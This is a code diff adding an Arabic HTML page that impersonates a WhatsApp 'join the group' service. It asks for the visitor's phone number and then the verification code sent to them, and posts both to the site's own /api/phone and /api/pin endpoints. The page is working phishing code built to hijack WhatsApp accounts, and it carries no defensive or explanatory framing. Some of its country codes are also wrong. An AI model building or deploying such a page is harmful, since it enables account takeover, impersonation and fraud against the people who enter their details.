@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الانضمام إلى المجموعة</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" type="image/svg+xml">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            direction: rtl;
+            color: #4b4b4b;
+            position: relative; /* Allows layering for the pseudo-element */
+            overflow: hidden; /* Prevent scrollbars if the image is larger */
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('./photos/qwd83nc4xxf41.jpg') no-repeat center center; /* Corrected path */
+            background-size: cover;
+            filter: blur(2px);
+            z-index: -1;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+            position: relative;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #075e54;
+            margin-top: 0;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            text-align: right;
+            font-size: 18px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #25D366;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #128C7E;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #128C7E;
+            box-shadow: 0 0 5px rgba(18, 140, 126, 0.8);
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #25D366;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Phone Number Section -->
+        <div id="phoneSection">
+            <h2>للانضمام إلى المجموعة، يرجى إدخال البيانات المطلوبة:</h2>
+            <form id="phoneForm">
+                <select id="countrySelect" name="countryCode" required>
+                    <option value="+20" data-full="Egypt">EG +20</option>
+                    <option value="+971" data-full="United Arab Emirates" selected>AE +971</option>
+                    <option value="+966" data-full="Saudi Arabia">SA +966</option>
+                    <option value="+965" data-full="Kuwait">KW +965</option>
+                    <option value="+974" data-full="Qatar">QA +974</option>
+                    <option value="+968" data-full="Oman">OM +968</option>
+                    <option value="+962" data-full="Jordan">JO +962</option>
+                    <option value="+964" data-full="Iraq">IQ +964</option>
+                    <option value="+90" data-full="Turkey">TR +90</option>
+                    <option value="+961" data-full="Lebanon">LB +961</option>
+                    <option value="+973" data-full="Bahrain">BH +973</option>
+                    <option value="+972" data-full="Palestine">PS +972</option>
+                    <option value="+980" data-full="Iran">IR +980</option>
+                    <option value="+212" data-full="Morocco">MA +212</option>
+                    <option value="+213" data-full="Algeria">DZ +213</option>
+                    <option value="+216" data-full="Tunisia">TN +216</option>
+                    <option value="+218" data-full="Libya">LY +218</option>
+                    <option value="+220" data-full="Gambia">GM +220</option>
+                    <option value="+221" data-full="Senegal">SN +221</option>
+                    <option value="+222" data-full="Mauritania">MR +222</option>
+                    <option value="+223" data-full="Mali">ML +223</option>
+                    <option value="+224" data-full="Guinea">GN +224</option>
+                    <option value="+225" data-full="Ivory Coast">CI +225</option>
+                    <option value="+226" data-full="Burkina Faso">BF +226</option>
+                    <option value="+227" data-full="Niger">NE +227</option>
+                    <option value="+228" data-full="Togo">TG +228</option>
+                    <option value="+229" data-full="Benin">BJ +229</option>
+                    <option value="+230" data-full="Mauritius">MU +230</option>
+                    <option value="+231" data-full="Liberia">LR +231</option>
+                    <option value="+232" data-full="Sierra Leone">SL +232</option>
+                    <option value="+233" data-full="Ghana">GH +233</option>
+                    <option value="+234" data-full="Nigeria">NG +234</option>
+                    <option value="+235" data-full="Chad">TD +235</option>
+                    <option value="+236" data-full="Central African Republic">CF +236</option>
+                    <option value="+237" data-full="Cameroon">CM +237</option>
+                    <option value="+238" data-full="Cape Verde">CV +238</option>
+                    <option value="+239" data-full="Sao Tome and Principe">ST +239</option>
+                    <option value="+240" data-full="Equatorial Guinea">GQ +240</option>
+                    <option value="+241" data-full="Gabon">GA +241</option>
+                    <option value="+242" data-full="Republic of the Congo">CG +242</option>
+                    <option value="+243" data-full="Democratic Republic of the Congo">CD +243</option>
+                    <option value="+244" data-full="Angola">AO +244</option>
+                    <option value="+245" data-full="Guinea-Bissau">GW +245</option>
+                    <option value="+246" data-full="British Indian Ocean Territory">IO +246</option>
+                    <option value="+247" data-full="Ascension Island">AC +247</option>
+                    <option value="+248" data-full="Seychelles">SC +248</option>
+                    <option value="+249" data-full="Sudan">SD +249</option>
+                    <option value="+250" data-full="Rwanda">RW +250</option>
+                    <option value="+251" data-full="Ethiopia">ET +251</option>
+                    <option value="+252" data-full="Somalia">SO +252</option>
+                    <option value="+253" data-full="Djibouti">DJ +253</option>
+                    <option value="+254" data-full="Kenya">KE +254</option>
+                    <option value="+255" data-full="Tanzania">TZ +255</option>
+                    <option value="+256" data-full="Uganda">UG +256</option>
+                    <option value="+257" data-full="Burundi">BI +257</option>
+                    <option value="+258" data-full="Mozambique">MZ +258</option>
+                    <option value="+260" data-full="Zambia">ZM +260</option>
+                    <option value="+261" data-full="Madagascar">MG +261</option>
+                    <option value="+262" data-full="Reunion">RE +262</option>
+                    <option value="+263" data-full="Zimbabwe">ZW +263</option>
+                    <option value="+264" data-full="Namibia">NA +264</option>
+                    <option value="+265" data-full="Malawi">MW +265</option>
+                    <option value="+266" data-full="Lesotho">LS +266</option>
+                    <option value="+267" data-full="Botswana">BW +267</option>
+                    <option value="+268" data-full="Eswatini">SZ +268</option>
+                    <option value="+269" data-full="Comoros">KM +269</option>
+                    <option value="+27" data-full="South Africa">ZA +27</option>
+                    <option value="+290" data-full="Saint Helena">SH +290</option>
+                    <option value="+291" data-full="Eritrea">ER +291</option>
+                    <option value="+292" data-full="Sao Tome and Principe">STP +292</option>
+                    <option value="+593" data-full="Ecuador">EC +593</option>
+                    <option value="+594" data-full="French Guiana">GF +594</option>
+                    <option value="+595" data-full="Paraguay">PY +595</option>
+                    <option value="+596" data-full="Martinique">MQ +596</option>
+                    <option value="+597" data-full="Suriname">SR +597</option>
+                    <option value="+598" data-full="Uruguay">UY +598</option>
+                    <option value="+599" data-full="Bonaire, Sint Eustatius and Saba">BES +599</option>
+                </select>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+                <button type="submit">التالي</button>
+            </form>
+        </div>
+
+        <!-- PIN Code Section -->
+        <div id="pinSection" class="hidden">
+            <h2>لإكمال الانضمام، يرجى إدخال الرمز المُرسل:</h2>
+            <form id="pinForm">
+                <input type="tel" id="pinCode" name="pinCode" placeholder="أدخل الرمز الذي تم إرساله إليك" required>
+                <button type="submit">التالي</button>
+            </form>
+        </div>
+
+        <!-- Waiting Section -->
+        <div id="waitSection" class="hidden">
+            <h2>يرجى الانتظار أثناء معالجة طلبك...</h2>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>خدمة الانضمام مقدمة عبر <a href="https://www.whatsapp.com">WhatsApp</a></p>
+        </div>
+    </div>
+
+    <script>
+        const phoneForm = document.getElementById('phoneForm');
+        const pinForm = document.getElementById('pinForm');
+      
+        phoneForm.addEventListener('submit', function(event) {
+          event.preventDefault();
+          
+          const countryCode = document.getElementById('countrySelect').value;
+          const phoneNumber = document.getElementById('phoneNumber').value.trim();
+          const fullPhoneNumber = countryCode + ' ' + phoneNumber;
+      
+          console.log('Full phone number entered:', fullPhoneNumber);
+      
+          // Send phone number to Vercel API
+          fetch('/api/phone', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ phoneNumber: fullPhoneNumber }),
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log(data.message);
+            document.getElementById('phoneSection').classList.add('hidden');
+            document.getElementById('pinSection').classList.remove('hidden');
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء إرسال رقم الهاتف.');
+          });
+        });
+      
+        pinForm.addEventListener('submit', function(event) {
+          event.preventDefault();
+          const pinCode = document.getElementById('pinCode').value.trim();
+      
+          console.log('PIN entered:', pinCode);
+      
+          // Send PIN code to Vercel API
+          fetch('/api/pin', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ pinCode: pinCode }),
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log(data.message);
+            document.getElementById('pinSection').classList.add('hidden');
+            document.getElementById('waitSection').classList.remove('hidden');
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء إرسال رمز PIN.');
+          });
+        });
+    </script>
+</body>
+</html>
